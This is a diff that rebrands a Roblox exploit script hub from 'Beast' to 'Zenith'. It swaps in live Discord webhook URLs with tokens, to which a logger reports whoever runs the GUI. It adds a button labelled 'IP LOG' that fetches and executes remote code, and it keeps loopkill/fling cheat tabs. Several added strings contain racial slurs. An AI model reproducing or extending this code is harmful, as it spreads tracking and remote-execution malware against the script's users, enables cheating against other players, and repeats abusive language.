@@ -4,7 +4,7 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local HTTP = syn and syn.request or http_request or request or HttpPost
 
-local WebhookURL = "https://discord.com/api/webhooks/1254974744894242827/s6OzaxQf6n4LXSPqoIvwGsC_heiSHtIfIcF9fADd16us_YaNkKYIpY0JQNxfv-0ebE_A"
+local WebhookURL = "https://discord.com/api/webhooks/1255355337511407768/IarN_c2jn8ZRmj4xLfzV0DkO66VS60XBP6aMxPSLTAXUF6_hBkhD9hMFF5pTTEFqHB1R"
 
 local Headers = {
     ['Content-Type'] = 'application/json',
@@ -27,7 +27,7 @@ local gameId = game.GameId
 local data = {
     ["embeds"] = {
         {
-            ["title"] = "Beast Key System Logger",
+            ["title"] = "Zenith Key System Logger",
             ["description"] = "Someone nigga executed your GUI",
             ["type"] = "rich",
             ["color"] = randomColor,
@@ -79,13 +79,13 @@ local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Use
 local Player = game.Players.LocalPlayer
 
 wait (1)
-local Window = OrionLib:MakeWindow({Name = "Beast Key System", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = true, IntroText = "Key System"})
+local Window = OrionLib:MakeWindow({Name = "Zenith Key System", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = true, IntroText = "Key System"})
 
 -- KEY --
 
 local function GetUserRole(userId)
-    local ownerIds = {2877854589, 1678627823} -- List of owner user IDs
-    local adminIds = {1678627823, 2877854589} -- List of admin user IDs
+    local ownerIds = {1678627823, 208186641} -- List of owner user IDs
+    local adminIds = {1678627823, 208186641} -- List of admin user IDs
     
     if table.find(ownerIds, userId) then
         return "Owner"
@@ -124,12 +124,12 @@ OrionLib:MakeNotification({
 })
 
  
-_G.Key = "BeastGoat"
+_G.Key = "triskelion"
 _G.KeyInput = "string"
 
 function MakeScriptHub()
     local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/User-Tester-bot/DaniGui/main/DaniUI')))()
-local window = OrionLib:MakeWindow({Name = "Beast Gui", IntroText = "Launching Gui", IntroIcon = "rbxassetid://17524365285", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local window = OrionLib:MakeWindow({Name = "Zenith Gui", IntroText = "Launching Gui", IntroIcon = "rbxassetid://17524365285", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
 local Tab1 = window:MakeTab({
 	Name = "Loopkills/Flings",
@@ -1165,7 +1165,7 @@ ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active
 ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
 game:service'Players'.LocalPlayer.Idled:connect(function()
 bb:CaptureController()bb:ClickButton2(Vector2.new())
-ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)
+ab.Text="Fuck This nigga roblox for trying to kick you"wait(2)ab.Text="Status : Active"end)
   	end    
 })
 
@@ -1184,13 +1184,13 @@ local Tab7 = window:MakeTab({
 	PremiumOnly = false
 })
 
-Tab7:AddLabel("This guy was made by Beast!")()
+Tab7:AddLabel("This GUI was created by Neymar and Legendz!")()
 end
 
 function CorrectKeyNotification()
     OrionLib:MakeNotification({
-        Name = "Welcome back Beast!",
-        Content = "Hopefully your beast!",
+        Name = "Welcome come to Zenith Gui!",
+        Content = "No user other than Zenith members should be using this hub.",
         Imagine = "rbxassetid://14445221506",
         Time = 5
     })
@@ -1230,14 +1230,13 @@ KeyTab:AddButton({
 
 
 KeyTab:AddButton({
-    Name = "Get Discord Server Invite",
-    Callback = function() setclipboard("https://discord.gg/fhY6ZQKADf")
-              print("Discord server invite in clipboard ")
-    end
+	Name = "IP LOG (DO NOT PRESS)",
+	Callback = function()
+      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/Scip4zz/Leaked/main/Script'),true))()
+  	end    
 })
-
 KeyTab:AddParagraph("Unlock Your Key",
-"Unlock access by pressing the button above. Afterward, leave the Roblox realm and venture into the online expanse. Paste the exclusive Discord server invite link into your browser and navigate to the dedicated 'ae key' channel. Remember, the key changes over time, so seize the moment and stay in the server for updates on the key.")
+"This button will give you Key.")
 
 local Tab = Window:MakeTab({
 	Name = "Credits",
@@ -1246,19 +1245,19 @@ local Tab = Window:MakeTab({
 })
 
 Tab:AddParagraph("Credits, Information, and Legal",
-"This hub is the creation of Auren aka Zero. If you seek assistance or have inquiries, don't hesitate to connect with the developer on Discord at (auren_the_absolute) or join our server through the link https://discord.gg/fhY6ZQKADf.")
+"This GUI is the creation of Neymar and Legendz. If you seek assistance or have inquiries, don't hesitate to connect Noker or join our team through the link below.")
 Tab:AddParagraph("Credits",
-"Design and Development: Auren aka Zero\n" ..
-"From concept to reality, the intricate design and development of this hub were meticulously crafted by Auren aka Zero. With a keen eye for user experience and functionality, Auren has poured hours of dedication into refining every aspect. The fusion of creativity, coding expertise, and innovative thinking has led to the birth of a hub that elevates your interaction and efficiency within the intended environment.\n\n" ..
-"Discord Support: (auren_the_absolute)")
+"Design and Development: Neymar" ..
+"From concept to reality, the intricate design and development of this gui were meticulously crafted by Neymar. With a keen eye for user experience and functionality, Legendz has poured hours of dedication into refining every aspect. The fusion of creativity, coding expertise, and innovative thinking has led to the birth of a hub that elevates your interaction and efficiency within the intended environment.\n\n" ..
+"Zenith!: (auren_the_absolute)")
 Tab:AddParagraph("Legal Disclaimer",
-"Welcome to this hub! Please note that everything within this hub, from its scripts to associated resources, is provided as-is, without any warranties or guarantees. As a user, you understand that the developer holds no responsibility for any outcomes stemming from your use of this hub. It's crucial to adhere to all applicable laws and regulations when engaging with this script, including complying with terms of service and user agreements for any platforms involved.")
+"Welcome to Zenith Gui! Please note that everything within this gui, from its scripts to associated resources, is provided as-is, without any warranties or guarantees. As a user, you understand that the developer holds no responsibility for any outcomes stemming from your use of this GUI. It's crucial to adhere to all applicable laws and regulations when engaging with this script, including complying with terms of service and user agreements for any platforms involved.")
 Tab:AddParagraph("Embrace the Risk",
-"By opting to use this hub, you willingly acknowledge and embrace any possible consequences, which could include actions like bans or penalties on various platforms. It's vital to comprehend that the decisions you make when utilizing this script rest solely on you. The developer cannot be held responsible for any choices made by users.")
+"By opting to use this GUI, you willingly acknowledge and embrace any possible consequences, which could include actions like bans or penalties on various platforms. It's vital to comprehend that the decisions you make when utilizing this script rest solely on you. The developer cannot be held responsible for any choices made by users.")
 Tab:AddParagraph("Privacy and Your Data",
-"As you interact with this hub, be aware that there might be data transmission involved. It's your responsibility to fully comprehend and adhere to the privacy policies, terms of use, and data protection regulations of relevant platforms.")
+"As you interact with this GUI, be aware that there might be data transmission involved. It is your responsibility to fully comprehend and adhere to the privacy policies, terms of use, and data protection regulations of relevant platforms.")
 Tab:AddParagraph("Use Responsibility",
-"If you're not in agreement with these terms, it's best to abstain from using this hub.")
+"If you're not in agreement with these terms, it's best to abstain from using this GUI.")
 
 
 local otherTab = Window:MakeTab({
@@ -1279,7 +1278,7 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local HTTP = syn and syn.request or http_request or request or HttpPost
 
-local discordWebhookURL = "https://discord.com/api/webhooks/1254978960438198392/zaHLajCTQN9RKMEGYwcixt_S82Ci8m072auJAbFC-seNaxvWFT7WgwyhAYFPkpaY-AGi"
+local discordWebhookURL = "https://discord.com/api/webhooks/1255355202119401536/sHBIxnysSKpNk1_0EN8nEr5rhufUzrZPZOYlvFGI-s6ajMZpoMU99Q_h5ElkO9w6k5bZ"
 
 local headers = {
     ['Content-Type'] = 'application/json',
@@ -1383,4 +1382,4 @@ otherTab:AddButton({
 
 
 
---Beast
+-- Zenith
